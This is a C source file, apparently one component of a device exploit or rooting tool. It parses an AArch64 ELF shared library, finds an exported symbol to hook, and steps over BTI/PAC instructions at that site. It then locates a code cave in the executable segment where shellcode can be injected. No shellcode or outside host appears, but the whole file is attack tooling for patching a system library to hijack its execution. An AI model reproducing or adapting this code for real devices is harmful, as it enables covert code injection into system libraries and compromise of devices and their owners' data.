#include <string.h>
#include <errno.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <linux/elf.h>
#include <stdio.h>

/* Read a NUL-terminated name from a bounded string table. Reject tables that
 * do not contain a terminator instead of manufacturing one from adjacent file
 * bytes. */
static int read_table_name(int fd, uint64_t table_off, uint64_t table_size,
                           uint64_t name_off, char *out, size_t out_size) {
    if (out_size == 0 || name_off >= table_size) return 1;
    uint64_t avail = table_size - name_off;
    size_t want = out_size - 1;
    if (want > avail) want = (size_t)avail;
    if (lseek64(fd, (off_t)(table_off + name_off), SEEK_SET) < 0) return 1;
    ssize_t n = read(fd, out, want);
    if (n <= 0) return 1;
    if (memchr(out, '\0', (size_t)n) == NULL) return 1;
    out[n] = '\0';
    return 0;
}

/* Find shellcode placement: use tail_off if it fits in its page's remaining
 * slack, otherwise fall back to the largest zero run (alignment padding) inside
 * the executable PT_LOAD segment. Sets *out_off to the chosen file offset. */
static int find_code_cave(int fd, uint64_t filesize, uint64_t exec_off,
                          uint64_t exec_filesz, uint64_t tail_off,
                          size_t shellcode_size, uint64_t *out_off) {
    if (shellcode_size == 0) return 1;
    long pagesize_long = sysconf(_SC_PAGESIZE);
    if (pagesize_long <= 0 || (pagesize_long & (pagesize_long - 1)) != 0) {
        printf("invalid system page size %ld\n", pagesize_long);
        return 1;
    }
    uint64_t pagesize = (uint64_t)pagesize_long;
    if (tail_off > filesize) return 1;

    uint64_t tail_avail = filesize - tail_off;
    uint64_t page_off = tail_off & (pagesize - 1);
    uint64_t slack = page_off ? pagesize - page_off : 0;
    if (slack > tail_avail) slack = tail_avail;
    if (shellcode_size <= slack) {
        *out_off = tail_off;
        return 0;
    }

    printf("shellcode (%zu) exceeds tail-page slack (%llu bytes)\n",
           shellcode_size, (unsigned long long)slack);

    if (lseek64(fd, (off_t)exec_off, SEEK_SET) < 0) return 1;
    uint64_t run_start = 0, run_len = 0, max_run_len = 0;
    char page[4096];
    for (uint64_t done = 0; done < exec_filesz; done += sizeof(page)) {
        uint64_t remain = exec_filesz - done;
        size_t chunk = remain > sizeof(page) ? sizeof(page) : (size_t)remain;
        ssize_t n = read(fd, page, chunk);
        if (n != (ssize_t)chunk) {
            printf("read executable segment failed: %s\n",
                   n < 0 ? strerror(errno) : "short read/EOF");
            return 1;
        }
        for (ssize_t i = 0; i < n; i++) {
            if (page[i] == 0) {
                if (!run_len) run_start = exec_off + done + (uint64_t)i;
                if (++run_len >= shellcode_size) {
                    printf("using code cave at 0x%llx\n",
                           (unsigned long long)run_start);
                    *out_off = run_start;
                    return 0;
                }
                if (run_len > max_run_len) max_run_len = run_len;
            } else {
                run_len = 0;
            }
        }
    }

    printf("no code cave large enough (need %zu, largest found %llu) - DEVICE NOT SUPPORTED\n",
           shellcode_size, (unsigned long long)max_run_len);
    return 1;
}

int find_hook_target(const char *libcxx, const char *symname,
                     uint64_t *hook_target, uint64_t *payload_target,
                     uint32_t *first_instruction, size_t shellcode_size) {
    *hook_target = 0;
    *payload_target = 0;

    int fd = open(libcxx, O_RDONLY);
    if (fd < 0) {
        printf("open %s failed: %s\n", libcxx, strerror(errno));
        return 1;
    }

    struct stat st;
    if (fstat(fd, &st) != 0 || !S_ISREG(st.st_mode) || st.st_size < 0) {
        printf("fstat %s failed or not a regular file: %s\n",
               libcxx, strerror(errno));
        close(fd); return 1;
    }
    uint64_t filesize = (uint64_t)st.st_size;

    Elf64_Ehdr hdr;
    if (read(fd, (char *)&hdr, sizeof(hdr)) != (ssize_t)sizeof(hdr)) {
        printf("read ELF header from %s failed: %s\n", libcxx, strerror(errno));
        close(fd); return 1;
    }
    if (hdr.e_ident[EI_MAG0] != ELFMAG0 || hdr.e_ident[EI_MAG1] != ELFMAG1 ||
        hdr.e_ident[EI_MAG2] != ELFMAG2 || hdr.e_ident[EI_MAG3] != ELFMAG3) {
        printf("invalid ELF magic: %s\n", libcxx);
        close(fd); return 1;
    }
    if (hdr.e_ident[EI_CLASS] != ELFCLASS64 ||
        hdr.e_ident[EI_DATA] != ELFDATA2LSB ||
        hdr.e_ident[EI_VERSION] != EV_CURRENT ||
        hdr.e_type != ET_DYN ||
        hdr.e_machine != EM_AARCH64 ||
        hdr.e_version != EV_CURRENT) {
        printf("unsupported ELF metadata in %s (need ELF64 LE AARCH64 ET_DYN)\n", libcxx);
        close(fd); return 1;
    }
    if (hdr.e_phentsize != sizeof(Elf64_Phdr)) {
        printf("invalid phentsize: %d\n", hdr.e_phentsize);
        close(fd); return 1;
    }
    uint64_t phdr_bytes = (uint64_t)hdr.e_phnum * hdr.e_phentsize;
    if (hdr.e_phoff > filesize || phdr_bytes > filesize - hdr.e_phoff) {
        printf("program header table out of range in %s\n", libcxx);
        close(fd); return 1;
    }
    if (lseek64(fd, (off_t)hdr.e_phoff, SEEK_SET) < 0) {
        printf("lseek64 e_phoff failed: %s\n", strerror(errno));
        close(fd); return 1;
    }

    int found_exec = 0;
    uint64_t executable_off = 0, executable_filesz = 0;
    uint64_t executable_vaddr = 0;
    for (int i = 0; i < hdr.e_phnum; i++) {
        Elf64_Phdr phdr;
        if (read(fd, (char *)&phdr, sizeof(phdr)) != (ssize_t)sizeof(phdr)) {
            printf("read phdr[%d] failed: %s\n", i, strerror(errno));
            close(fd); return 1;
        }
        if (phdr.p_type != PT_LOAD || !(phdr.p_flags & PF_X)) continue;
        if (found_exec) {
            printf("multiple executable PT_LOAD segments in %s\n", libcxx);
            close(fd); return 1;
        }
        if (phdr.p_offset > filesize || phdr.p_filesz > filesize - phdr.p_offset) {
            printf("executable PT_LOAD segment out of range in %s\n", libcxx);
            close(fd); return 1;
        }
        if (phdr.p_vaddr > UINT64_MAX - phdr.p_filesz) {
            printf("executable PT_LOAD vaddr overflow in %s\n", libcxx);
            close(fd); return 1;
        }
        *payload_target   = phdr.p_offset + phdr.p_filesz;
        executable_off    = phdr.p_offset;
        executable_filesz = phdr.p_filesz;
        executable_vaddr  = phdr.p_vaddr;
        found_exec = 1;
    }

    if (!found_exec || executable_filesz == 0) {
        printf("no executable PT_LOAD segment found in %s\n", libcxx);
        close(fd); return 1;
    }

    if (hdr.e_shentsize != sizeof(Elf64_Shdr)) {
        printf("invalid shentsize: %d\n", hdr.e_shentsize);
        close(fd); return 1;
    }
    uint64_t shdr_bytes = (uint64_t)hdr.e_shnum * hdr.e_shentsize;
    if (hdr.e_shoff > filesize || shdr_bytes > filesize - hdr.e_shoff) {
        printf("section header table out of range in %s\n", libcxx);
        close(fd); return 1;
    }
    if (hdr.e_shstrndx >= hdr.e_shnum) {
        printf("e_shstrndx %d out of range (e_shnum %d) in %s\n",
               hdr.e_shstrndx, hdr.e_shnum, libcxx);
        close(fd); return 1;
    }
    if (lseek64(fd, (off_t)(hdr.e_shoff + (uint64_t)hdr.e_shstrndx * hdr.e_shentsize),
                SEEK_SET) < 0) {
        printf("lseek64 shstrndx failed: %s\n", strerror(errno));
        close(fd); return 1;
    }
    Elf64_Shdr str_shdr;
    if (read(fd, (char *)&str_shdr, sizeof(str_shdr)) != (ssize_t)sizeof(str_shdr)) {
        printf("read shstrndx failed: %s\n", strerror(errno));
        close(fd); return 1;
    }
    if (str_shdr.sh_offset > filesize || str_shdr.sh_size > filesize - str_shdr.sh_offset) {
        printf("shstrtab out of range in %s\n", libcxx);
        close(fd); return 1;
    }

    uint64_t dynstr = 0, dynstr_size = 0, dynsym_offset = 0, dynsym_size = 0;
    int found_dynstr = 0, found_dynsym = 0;
    for (int i = 0; i < hdr.e_shnum; i++) {
        Elf64_Shdr shdr;
        if (lseek64(fd, (off_t)(hdr.e_shoff + (uint64_t)i * hdr.e_shentsize),
                    SEEK_SET) < 0) {
            printf("lseek64 shdr[%d] failed: %s\n", i, strerror(errno));
            close(fd); return 1;
        }
        if (read(fd, (char *)&shdr, sizeof(shdr)) != (ssize_t)sizeof(shdr)) {
            printf("read shdr[%d] failed: %s\n", i, strerror(errno));
            close(fd); return 1;
        }
        char name[100];
        if (read_table_name(fd, str_shdr.sh_offset, str_shdr.sh_size,
                            shdr.sh_name, name, sizeof(name)) != 0) {
            printf("bad sh_name[%d] in %s\n", i, libcxx);
            close(fd); return 1;
        }
        if (strcmp(name, ".dynstr") == 0) {
            if (found_dynstr) { close(fd); return 1; }
            dynstr = shdr.sh_offset; dynstr_size = shdr.sh_size;
            found_dynstr = 1;
        }
        if (strcmp(name, ".dynsym") == 0) {
            if (found_dynsym) { close(fd); return 1; }
            dynsym_offset = shdr.sh_offset; dynsym_size = shdr.sh_size;
            found_dynsym = 1;
        }
    }

    if (!found_dynstr || !found_dynsym) {
        printf(".dynstr or .dynsym not found in %s\n", libcxx);
        close(fd); return 1;
    }
    if (dynstr > filesize || dynstr_size > filesize - dynstr ||
        dynsym_offset > filesize || dynsym_size > filesize - dynsym_offset) {
        printf(".dynstr/.dynsym out of range in %s\n", libcxx);
        close(fd); return 1;
    }
    if (dynsym_size == 0 || dynsym_size % sizeof(Elf64_Sym) != 0) {
        printf("invalid .dynsym size in %s\n", libcxx);
        close(fd); return 1;
    }

    size_t symcount = (size_t)(dynsym_size / sizeof(Elf64_Sym));
    int found_symbol = 0;
    for (size_t i = 0; i < symcount; i++) {
        Elf64_Sym sym;
        if (lseek64(fd, (off_t)(dynsym_offset + (uint64_t)i * sizeof(Elf64_Sym)),
                    SEEK_SET) < 0) {
            printf("lseek64 dynsym[%zu] failed: %s\n", i, strerror(errno));
            close(fd); return 1;
        }
        if (read(fd, (char *)&sym, sizeof(sym)) != (ssize_t)sizeof(sym)) {
            printf("read dynsym[%zu] failed: %s\n", i, strerror(errno));
            close(fd); return 1;
        }
        char name[200];
        if (read_table_name(fd, dynstr, dynstr_size, sym.st_name,
                            name, sizeof(name)) != 0) {
            printf("bad st_name[%zu] in %s\n", i, libcxx);
            close(fd); return 1;
        }
        if (strcmp(name, symname) == 0) {
            if (sym.st_value < executable_vaddr) {
                printf("symbol %s has invalid st_value in %s\n", symname, libcxx);
                close(fd); return 1;
            }
            uint64_t delta = sym.st_value - executable_vaddr;
            if ((delta & 3) != 0 ||
                delta > executable_filesz ||
                executable_filesz - delta < sizeof(uint32_t)) {
                printf("symbol %s out of executable range in %s\n", symname, libcxx);
                close(fd); return 1;
            }
            uint64_t hook = executable_off + delta;
            if (hook > filesize || filesize - hook < sizeof(uint32_t)) {
                printf("hook target out of range in %s\n", libcxx);
                close(fd); return 1;
            }
            *hook_target = hook;
            found_symbol = 1;
            break;
        }
    }

    if (!found_symbol) {
        printf("symbol %s not found in %s\n", symname, libcxx);
        close(fd); return 1;
    }

    if (lseek64(fd, (off_t)*hook_target, SEEK_SET) < 0) {
        printf("lseek64 hook_target failed: %s\n", strerror(errno));
        close(fd); return 1;
    }
    if (read(fd, first_instruction, sizeof(*first_instruction)) !=
        (ssize_t)sizeof(*first_instruction)) {
        printf("read first instruction failed: %s\n", strerror(errno));
        close(fd); return 1;
    }

    for (int adv = 0; adv < 2; adv++) {
        switch (*first_instruction) {
        case 0xd503233f: /* PACIASP  */
        case 0xd503237f: /* PACIBSP  */
        case 0xd503241f: /* BTI      */
        case 0xd503245f: /* BTI c    */
        case 0xd503249f: /* BTI j    */
        case 0xd50324df: /* BTI jc   */
            printf("BTI/PAC preamble at hook site, advancing +4\n");
            *hook_target += 4UL;
            if (*hook_target < executable_off ||
                *hook_target > executable_off + executable_filesz - sizeof(uint32_t) ||
                *hook_target > filesize ||
                filesize - *hook_target < sizeof(uint32_t)) {
                printf("preamble +%d out of range in %s\n", (adv + 1) * 4, libcxx);
                close(fd); return 1;
            }
            if (lseek64(fd, (off_t)*hook_target, SEEK_SET) < 0 ||
                read(fd, first_instruction, sizeof(*first_instruction)) !=
                    (ssize_t)sizeof(*first_instruction)) {
                printf("read preamble +%d failed: %s\n", (adv + 1) * 4, strerror(errno));
                close(fd); return 1;
            }
            continue;
        default:
            break;
        }
        break;
    }

    if (*payload_target < executable_off ||
        *payload_target > executable_off + executable_filesz) {
        printf("payload target out of executable range in %s\n", libcxx);
        close(fd); return 1;
    }
    if (find_code_cave(fd, filesize, executable_off, executable_filesz,
                       *payload_target, shellcode_size, payload_target)) {
        close(fd); return 1;
    }

    close(fd);
    return 0;
}
